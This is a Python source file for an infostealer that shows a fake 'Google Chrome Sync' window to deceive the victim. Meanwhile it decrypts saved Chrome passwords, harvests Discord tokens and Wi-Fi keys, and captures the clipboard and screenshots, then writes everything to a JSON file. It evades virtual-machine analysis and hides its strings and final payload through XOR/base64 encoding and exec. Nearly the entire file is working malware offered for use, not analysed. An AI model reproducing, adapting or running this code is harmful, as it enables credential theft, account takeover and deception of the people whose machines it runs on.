import base64, zlib, marshal, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets
from pathlib import Path
from datetime import datetime

# =================== AUTO-INSTALL MISSING PACKAGES ===================
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package])

required = {
    "pywin32": None,
    "cryptography": None,
    "pillow": None,
    "pyautogui": None,  # just in case
    "shutil": None  # built-in, but whatever
}

missing = []
for pkg in ["pywin32", "cryptography", "Pillow"]:
    try:
        __import__(pkg.lower() if pkg != "pywin32" else "win32crypt")
    except ImportError:
        missing.append(pkg)

if missing:
    print(f"Installing missing packages: {', '.join(missing)}")
    for pkg in missing:
        install_package(pkg)
    print("Packages installed. Restarting script...")
    os.execv(sys.executable, [sys.executable] + sys.argv)  # restart after install

# Now safe to import
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from PIL import ImageGrab
import shutil
import io

# =================== FAKE GUI POPUP (runs in thread) ===================
import threading
import tkinter as tk
from tkinter import ttk, messagebox

def fake_gui():
    time.sleep(2)  # delay so it feels "natural"

    root = tk.Tk()
    root.title("Google Chrome Sync")
    root.geometry("420x280")
    root.resizable(False, False)
    root.configure(bg="#f0f0f0")

    # Fake Chrome logo (text because no image dep)
    title = tk.Label(root, text="Google Chrome", font=("Segoe UI", 18, "bold"), bg="#f0f0f0", fg="#4285F4")
    title.pack(pady=15)

    subtitle = tk.Label(root, text="Sign in to sync your data across devices", font=("Segoe UI", 10), bg="#f0f0f0")
    subtitle.pack(pady=5)

    frame = ttk.Frame(root, padding="20")
    frame.pack(fill="both", expand=True)

    tk.Label(frame, text="Verifying your session...", font=("Segoe UI", 10)).pack(pady=10)

    progress = ttk.Progressbar(frame, mode="indeterminate", length=300)
    progress.pack(pady=15)
    progress.start(10)

    status = tk.Label(frame, text="Please wait while we sync your passwords and history...", fg="gray", bg="#f0f0f0")
    status.pack(pady=5)

    def close_app():
        root.destroy()

    # Fake button that does nothing but look legit
    btn = tk.Button(frame, text="Cancel", command=close_app, width=15)
    btn.pack(pady=10)

    root.protocol("WM_DELETE_WINDOW", close_app)
    root.attributes("-topmost", True)  # stays on top like real popups
    root.mainloop()

# Start GUI in background thread
threading.Thread(target=fake_gui, daemon=True).start()

# =================== REST OF THE OBFUSCATED STEALER (same as before) ===================
def _0x1(a):
    k = "xAI_is_god_42069"
    return ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(base64.b64decode(a).decode('latin1')))

def _0x2(t=1337):
    time.sleep((t + random.randint(100, 1000)) / 1000)

_0x2()

_e = {
    "app": _0x1("JgA1Aw0SJgMiKzI="),
    "chr": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWU="),
    "net": _0x1("BAYFBlQHDw=="),
    "wla": _0x1("BAYFBlQHDwMGBwYSJw=="),
    "key": _0x1("DAgMAA0EVQ=="),
    "pow": _0x1("CQkFBAcFBg=="),
    "cli": _0x1("R0VULUNsaXBib2FyZA=="),
}

def is_vm():
    _0x2(500)
    try:
        c = ctypes.windll.kernel32
        class M(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
        m = M(); m.dwLength = ctypes.sizeof(m)
        c.GlobalMemoryStatusEx(ctypes.byref(m))
        if m.ullTotalPhys // (1024*1024) < 3999: return True
    except: pass
    if os.cpu_count() < 4: return True
    return False

def _0x6():
    _0x2(200)
    try:
        g = ImageGrab.grab(all_screens=True)
        b = io.BytesIO()
        g.save(b, format="PNG")
        return base64.b64encode(b.getvalue()).decode()
    except: return ""

def _0x7():
    try:
        r = subprocess.run([_e["pow"], "-noprofile", "-Command", _e["cli"]], capture_output=True, text=True)
        return r.stdout.strip()
    except: return ""

def _0x8(): return socket.gethostname()

def _0x9():
    w = []
    try:
        o = subprocess.check_output([_e["net"], _e["wla"], "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
        p = re.findall(r"All User Profile\s*:\s*(.+)", o)
        for n in p:
            n = n.strip()
            o2 = subprocess.check_output([_e["net"], _e["wla"], "show", "profile", n, _e["key"]], text=True, stderr=subprocess.DEVNULL)
            k = re.search(r"Key Content\s*:\s*(.+)", o2)
            if k: w.append({"ssid": n, "pass": k.group(1).strip()})
    except: pass
    return w

def _0x10():
    c = []
    if sys.platform != "win32": return c
    a = os.getenv(_e["app"])
    if not a: return c
    ls = Path(a) / "Google" / "Chrome" / "User Data" / "Local State"
    ld = Path(a) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not ls.exists() or not ld.exists(): return c
    try:
        with open(ls, "r", encoding="utf-8") as f:
            s = json.load(f)
        ek = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
        td = Path(os.getenv("TEMP")) / f"{secrets.token_hex(8)}.db"
        shutil.copy(ld, td)
        import sqlite3
        conn = sqlite3.connect(str(td))
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, ep in cur.fetchall():
            if ep[:3] not in (b"v10", b"v11"): continue
            nonce, ct, tag = ep[3:15], ep[15:-16], ep[-16:]
            pt = AESGCM(mk).decrypt(nonce, ct + tag, None)
            c.append({"url": url, "username": user, "password": pt.decode(errors="ignore")})
        conn.close()
        os.unlink(td)
    except: pass
    return c

def _0x11():
    t = set()
    paths = [
        Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordcanary" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordptb" / "Local Storage" / "leveldb",
    ]
    pat = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}"
    for p in paths:
        if not p.exists(): continue
        for f in list(p.glob("*.ldb")) + list(p.glob("*.log")):
            try:
                with open(f, "r", errors="ignore") as fh:
                    for m in re.finditer(pat, fh.read()):
                        t.add(m.group())
            except: pass
    return list(t)

# === FINAL PAYLOAD ===
real_code = '''
import time as t, json
from datetime import datetime

def run():
    if is_vm():
        t.sleep(1800)
    data = {
        "info": {
            "hostname": _0x8(),
            "screenshot": _0x6(),
            "clipboard": _0x7(),
            "wifi": _0x9(),
            "timestamp": datetime.utcnow().isoformat()
        },
        "creds": {
            "browser_passwords": _0x10(),
            "discord_tokens": _0x11()
        }
    }
    with open("data_collected.json", "w") as f:
        json.dump(data, f, indent=2)
    while True:
        t.sleep(86400)

run()
'''

code_obj = compile(real_code, '<payload>', 'exec')
exec(marshal.loads(zlib.decompress(zlib.compress(marshal.dumps(code_obj)))), globals())
